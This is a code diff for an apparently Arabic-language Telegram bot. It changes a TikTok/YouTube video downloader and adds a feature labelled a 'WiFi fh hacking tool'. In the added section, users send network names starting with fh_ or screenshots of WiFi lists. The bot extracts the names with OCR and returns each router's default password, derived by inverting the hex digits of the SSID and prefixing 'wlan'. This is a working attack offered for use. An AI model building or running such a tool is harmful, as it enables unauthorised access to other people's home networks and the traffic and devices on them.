@@ -3,7 +3,6 @@ import telebot
 from telebot import types
 import time
 import yt_dlp
-import requests
 
 from PIL import Image
 import pytesseract
@@ -24,6 +23,7 @@ OWNER_ID = "5883400070"  # ايدي المالك
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Flask(__name__)
 
+user_links = {}
 user_platform = {}
 user_video_info = {}
 user_state = {}
@@ -33,6 +33,7 @@ PLATFORMS = ["يوتيوب", "انستغرام", "تيك توك"]
 # --- دوال الحظر والتحقق من القناة ---
 
 def is_banned(user_id):
+    # تخطى الحظر للمالك
     if str(user_id) == OWNER_ID:
         return 0
     now = int(time.time())
@@ -41,12 +42,13 @@ def is_banned(user_id):
             for line in f:
                 uid, ban_until = line.strip().split(":")
                 if str(user_id) == uid and now < int(ban_until):
-                    return int(ban_until) - now
+                    return int(ban_until) - now  # كم باقي من الحظر
     except FileNotFoundError:
         pass
     return 0
 
 def ban_user(user_id):
+    # لا تحظر المالك
     if str(user_id) == OWNER_ID:
         return
     ban_until = int(time.time()) + BAN_DURATION
@@ -61,14 +63,14 @@ def ban_user(user_id):
         f.writelines(lines)
 
 def is_user_joined(user_id):
-    if str(user_id) == OWNER_ID:
+    # استثناء المالك من التحقق من القناة
+    if str(user_id) == "5883400070":
         return True
     try:
         member = bot.get_chat_member(f"@{CHANNEL_USERNAME}", user_id)
         return member.status in ['member', 'creator', 'administrator']
-    except Exception as e:
-        print(f"تحذير: تعذر التحقق من عضوية المستخدم {user_id} في القناة: {e}")
-        return True
+    except:
+        return False
 
 def ban_message(chat_id, ban_left=None):
     if ban_left is not None:
@@ -89,7 +91,8 @@ def ban_message(chat_id, ban_left=None):
 
 def check_access(message):
     user_id = message.from_user.id
-    if str(user_id) == OWNER_ID:
+    # استثناء المالك من كل الشروط
+    if str(user_id) == "5883400070":
         return True
     ban_left = is_banned(user_id)
     if ban_left > 0:
@@ -158,7 +161,7 @@ def ask_for_link(message):
     if message.text in ["يوتيوب", "انستغرام"]:
         bot.send_message(
             message.chat.id,
-            "⚠️ هذه الخدمة في صيانة حاليًا.\nيرجى اختيار منصة أخرى.",
+            "⚠️ هذه الخدمة في صيانة حاليًا. يرجى اختيار منصة أخرى.",
         )
         send_platforms(message.chat.id)
         return
@@ -175,8 +178,7 @@ def back_handler(message):
         return
     state = user_state.get(message.chat.id, "main_menu")
     if state == "waiting_link":
-        if message.from_user.id in user_platform:
-            user_platform.pop(message.from_user.id)
+        user_platform.pop(message.from_user.id, None)
         send_platforms(message.chat.id)
     elif state == "platforms":
         show_main_menu(message.chat.id, msg_only=True)
@@ -200,55 +202,59 @@ def handle_link(message):
     platform = user_platform.get(message.from_user.id)
     url = message.text.strip()
 
-    if platform == "تيك توك" and ("tiktok" in url or "تيك توك" in url):
-        caption = "🎬 اختر نوع التحميل:\n\n🎬 تحميل الفيديو (mp4)\n🎵 تحميل الصوت (mp3)"
-        markup = types.InlineKeyboardMarkup()
-        markup.add(
-            types.InlineKeyboardButton("🎬 تحميل الفيديو", callback_data=f"video|{url}"),
-            types.InlineKeyboardButton("🎵 تحميل الصوت (mp3)", callback_data=f"audio|{url}")
+    # تحقق من تطابق الرابط مع المنصة المختارة
+    if (platform == "يوتيوب" and not ("youtube.com" in url or "youtu.be" in url or "يوتيوب" in url)) or \
+       (platform == "انستغرام" and not ("instagram" in url or "انستغرام" in url)) or \
+       (platform == "تيك توك" and not ("tiktok" in url or "تيك توك" in url)):
+        bot.send_message(
+            message.chat.id,
+            "❌ هذا الرابط لا يخص المنصة المختارة.\nيرجى اختيار المنصة الصحيحة من جديد.",
         )
-        try:
-            with yt_dlp.YoutubeDL({'quiet': True}) as ydl:
-                info = ydl.extract_info(url, download=False)
-                title = info.get('title', 'بدون عنوان')
-                duration = info.get('duration', 0)
-                thumb = info.get('thumbnail')
-                mins = duration // 60
-                secs = duration % 60
-                caption = f"🎬 <b>{title}</b>\n⏱️ المدة: {mins}:{secs:02d}\n\n🎬 تحميل الفيديو (mp4) أو 🎵 تحميل الصوت (mp3):"
-        except Exception as e:
-            thumb = None
-
-        if thumb:
-            bot.send_photo(message.chat.id, thumb, caption=caption, parse_mode="HTML", reply_markup=markup)
-        else:
-            bot.send_message(message.chat.id, caption, parse_mode="HTML", reply_markup=markup)
-        bot.send_message(message.chat.id, "⬅️ للرجوع اضغط على زر 🔙 رجوع في الأسفل.", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True).add("🔙 رجوع"))
-        user_state[message.chat.id] = "waiting_link"
+        send_platforms(message.chat.id)
+        user_platform.pop(message.from_user.id, None)
         return
 
-    # إذا حاول إرسال رابط لأي منصة أخرى (يوتيوب/انستغرام) أعد القائمة
-    bot.send_message(
-        message.chat.id,
-        "⚠️ هذه الخدمة في صيانة حاليًا.\nيرجى اختيار منصة أخرى.",
-    )
-    send_platforms(message.chat.id)
+    user_links[message.from_user.id] = url
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("video|") or call.data.startswith("audio|"))
+    caption = "🎬 اختر نوع التحميل:\n\n🎬 تحميل الفيديو (mp4)\n🎵 تحميل الصوت (mp3)"
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🎬 تحميل الفيديو", callback_data="video"),
+        types.InlineKeyboardButton("🎵 تحميل الصوت (mp3)", callback_data="audio")
+    )
+    # جلب معلومات الفيديو (لإظهار العنوان والصورة فقط)
+    try:
+        with yt_dlp.YoutubeDL({'quiet': True}) as ydl:
+            info = ydl.extract_info(url, download=False)
+            user_video_info[message.from_user.id] = info
+            title = info.get('title', 'بدون عنوان')
+            duration = info.get('duration', 0)
+            thumb = info.get('thumbnail')
+            mins = duration // 60
+            secs = duration % 60
+            caption = f"🎬 <b>{title}</b>\n⏱️ المدة: {mins}:{secs:02d}\n\n🎬 تحميل الفيديو (mp4) أو 🎵 تحميل الصوت (mp3):"
+    except Exception as e:
+        thumb = None
+
+    if thumb:
+        bot.send_photo(message.chat.id, thumb, caption=caption, parse_mode="HTML", reply_markup=markup)
+    else:
+        bot.send_message(message.chat.id, caption, parse_mode="HTML", reply_markup=markup)
+    bot.send_message(message.chat.id, "⬅️ للرجوع اضغط على زر 🔙 رجوع في الأسفل.", reply_markup=types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True).add("🔙 رجوع"))
+    user_state[message.chat.id] = "waiting_link"
+
+@bot.callback_query_handler(func=lambda call: call.data in ("video", "audio"))
 def process_download(call):
     if not check_access(call):
         return
-
-    action, url = call.data.split("|", 1)
-
-    if not ("tiktok" in url or "تيك توك" in url):
-        bot.send_message(
-            call.message.chat.id,
-            "⚠️ هذه الخدمة في صيانة حاليًا.\nيرجى اختيار منصة أخرى.",
-        )
-        send_platforms(call.message.chat.id)
+    url = user_links.get(call.from_user.id)
+    platform = user_platform.get(call.from_user.id, "المنصة")
+    info = user_video_info.get(call.from_user.id)
+    if not url:
+        bot.answer_callback_query(call.id, "❌ لم يتم العثور على رابط، أرسل الرابط من جديد.")
         return
 
+    action = call.data
     msg = bot.send_message(call.message.chat.id, "⏳ جاري التحميل، انتظر قليلاً...")
 
     try:
@@ -292,13 +298,212 @@ def process_download(call):
     )
     user_state[call.message.chat.id] = "waiting_link"
 
-# باقي كود الواي فاي كما هو...
+@bot.message_handler(func=lambda m: m.text in ["منصة أخرى", "نفس المنصة"])
+def next_action(message):
+    if not check_access(message):
+        return
+    if message.text == "منصة أخرى":
+        send_platforms(message.chat.id)
+    elif message.text == "نفس المنصة":
+        platform = user_platform.get(message.from_user.id, "المنصة")
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        markup.add("🔙 رجوع")
+        bot.send_message(message.chat.id, f"📥 أرسل رابط الفيديو من {platform}:", reply_markup=markup)
+        user_state[message.chat.id] = "waiting_link"
+
+# ----------- أداة اختراق WiFi fh -----------
+
+def show_wifi_methods(chat_id):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("✍️ كتابة اسم الراوتر", "🖼️ صورة لجميع الراوترات", "🔙 رجوع")
+    bot.send_message(
+        chat_id,
+        "📡 اختر طريقة إدخال اسم الراوتر:\n"
+        "✍️ كتابة اسم الراوتر يدويًا (fh_...)\n"
+        "🖼️ أو أرسل صورة لقائمة الشبكات.",
+        reply_markup=markup
+    )
+    user_state[chat_id] = "wifi_methods"
+
+@bot.message_handler(func=lambda m: m.text == "📡 أداة اختراق WiFi fh")
+def wifi_request(message):
+    if not check_access(message):
+        return
+    show_wifi_methods(message.chat.id)
+
+@bot.message_handler(func=lambda m: m.text == "✍️ كتابة اسم الراوتر")
+def manual_ssid(message):
+    if not check_access(message):
+        return
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔙 رجوع")
+    sent = bot.send_message(message.chat.id, "🔍 أرسل اسم شبكة WiFi (يجب أن تبدأ بـ fh_):", reply_markup=markup)
+    bot.register_next_step_handler(sent, generate_password_with_back)
+    user_state[message.chat.id] = "wifi_name_or_image"
+
+def generate_password_with_back(message):
+    if not check_access(message):
+        return
+    if message.text == "🔙 رجوع":
+        show_wifi_methods(message.chat.id)
+        return
+    generate_password(message)
+
+@bot.message_handler(func=lambda m: m.text == "🖼️ صورة لجميع الراوترات")
+def ask_for_wifi_image(message):
+    if not check_access(message):
+        return
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔙 رجوع")
+    sent = bot.send_message(message.chat.id, "📸 أرسل صورة لقائمة شبكات WiFi الظاهرة في إعدادات هاتفك *الراوترات المدعومة التي تبدا ب fh فقط*.", reply_markup=markup)
+    bot.register_next_step_handler(sent, process_wifi_image_with_back)
+    user_state[message.chat.id] = "wifi_name_or_image"
+
+def process_wifi_image_with_back(message):
+    if not check_access(message):
+        return
+    if message.text == "🔙 رجوع":
+        show_wifi_methods(message.chat.id)
+        return
+    process_wifi_image(message)
+
+@bot.message_handler(func=lambda m: m.text == "🔁 اختراق WiFi آخر")
+def another_wifi(message):
+    if not check_access(message):
+        return
+    show_wifi_methods(message.chat.id)
+
+def extract_ssids_from_text(text):
+    return re.findall(r'(fh_[a-zA-Z0-9]{6,7})', text)
+
+def smart_correct_ssid(ssid):
+    if ssid.startswith("fh_"):
+        prefix = "fh_"
+        rest = ssid[3:]
+        rest = rest.replace('l', '1').replace('I', '1')
+        rest = rest.replace('O', '0').replace('o', '0')
+        if len(rest) == 6 and rest[3] == '0':
+            rest = rest[:3] + 'a' + rest[4:]
+        return prefix + rest
+    return ssid
+
+@bot.message_handler(content_types=['photo'])
+def process_wifi_image(message):
+    if not check_access(message):
+        return
+    wait_msg = bot.send_message(message.chat.id, "⏳ جاري معالجة الصورة، يرجى الانتظار...")
+
+    def try_extract(image):
+        texts = []
+        texts.append(pytesseract.image_to_string(image, lang='eng'))
+        img2 = image.convert('L').point(lambda x: 0 if x < 140 else 255, '1')
+        texts.append(pytesseract.image_to_string(img2, lang='eng'))
+        return texts
+
+    file_info = bot.get_file(message.photo[-1].file_id)
+    downloaded_file = bot.download_file(file_info.file_path)
+    image = Image.open(io.BytesIO(downloaded_file))
+
+    max_width = 800
+    if image.width > max_width:
+        ratio = max_width / image.width
+        new_size = (int(image.width * ratio), int(image.height * ratio))
+        image = image.resize(new_size)
+
+    texts = try_extract(image)
+
+    all_ssids = []
+    seen = set()
+    for text in texts:
+        found = re.findall(r'(fh_[a-zA-Z0-9]{6,7})', text)
+        for ssid in found:
+            ssid_corrected = smart_correct_ssid(ssid)
+            hex_part = ssid_corrected[3:]
+            if ssid_corrected not in seen and all(c in '0123456789abcdef' for c in hex_part.lower()):
+                seen.add(ssid_corrected)
+                all_ssids.append(ssid_corrected)
+
+    bot.delete_message(message.chat.id, wait_msg.message_id)
+
+    if not all_ssids:
+        bot.send_message(
+            message.chat.id,
+            "❌ لم يتم العثور على أي شبكة تبدأ بـ fh_ في الصورة.\n"
+            "يرجى التأكد من وضوح الصورة أو إرسال لقطة شاشة مباشرة من الجهاز."
+        )
+        return
+
+    reply = ""
+    for ssid in all_ssids:
+        password = generate_wifi_password(ssid)
+        reply += f"📶 <b>{ssid}</b>\n🔑 <code>{password}</code>\n\n"
+    reply += "📋 يمكنك نسخ كلمة السر بالضغط عليها."
+
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+    markup.add("🔁 اختراق WiFi آخر", "🔙 رجوع")
+    bot.send_message(message.chat.id, reply, parse_mode="HTML", reply_markup=markup)
+
+def generate_wifi_password(ssid):
+    ssid = ssid.strip().lower()
+    if not ssid.startswith("fh_"):
+        return None
+    hex_part = ssid[3:]
+    valid_chars = '0123456789abcdef'
+    if not all(c in valid_chars for c in hex_part):
+        return None
+    table = {
+        '0': 'f', '1': 'e', '2': 'd', '3': 'c',
+        '4': 'b', '5': 'a', '6': '9', '7': '8',
+        '8': '7', '9': '6', 'a': '5', 'b': '4',
+        'c': '3', 'd': '2', 'e': '1', 'f': '0'
+    }
+    encoded = ''.join(table.get(c, c) for c in hex_part)
+    return f"wlan{encoded}"
+
+def generate_password(message):
+    ssid = message.text.strip().lower()
+    if not ssid.startswith("fh_"):
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        markup.add("🔁 اختراق WiFi آخر", "🔙 رجوع")
+        bot.send_message(message.chat.id, "❌ لم يتم التعرف على الشبكة. أعد المحاولة.", reply_markup=markup)
+        return
+
+    hex_part = ssid[3:]
+    valid_chars = '0123456789abcdef'
+    if not all(c in valid_chars for c in hex_part):
+        bot.send_message(message.chat.id, "❌ صيغة غير صحيحة.")
+        return
+
+    table = {
+        '0': 'f', '1': 'e', '2': 'd', '3': 'c',
+        '4': 'b', '5': 'a', '6': '9', '7': '8',
+        '8': '7', '9': '6', 'a': '5', 'b': '4',
+        'c': '3', 'd': '2', 'e': '1', 'f': '0'
+    }
+
+    try:
+        encoded = ''.join(table.get(c, c) for c in hex_part)
+        password = f"wlan{encoded}"
+
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
+        markup.add("🔁 اختراق WiFi آخر", "🔙 رجوع")
+        bot.send_message(
+            message.chat.id,
+            f"✅ تم توليد كلمة السر الخاصة بالشبكة:\n\n"
+            f"🔑 <b>كلمة السر:</b>\n"
+            f"<code>{password}</code>\n\n"
+            f"📋 يمكنك نسخ كلمة السر بالضغط عليها.",
+            parse_mode="HTML",
+            reply_markup=markup
+        )
+    except Exception as e:
+        bot.send_message(message.chat.id, "❌ حصل خطأ أثناء توليد كلمة السر.")
 
 @bot.message_handler(func=lambda m: True)
 def fallback_handler(message):
     if not check_access(message):
         return
-    show_main_menu(message.chat.id, msg_only=True)
+    show_main_menu(message.chat.id, msg_only=False)  # دائماً أرسل رسالة الترحيب مع القائمة الرئيسية
 
 # ----------------- Webhook Flask -----------------
 
@@ -314,8 +519,6 @@ def webhook():
 
 @app.route('/')
 def index():
-    bot.remove_webhook()
-    bot.set_webhook(url=WEBHOOK_URL)
     return "Webhook set!", 200
 
 if __name__ == '__main__':
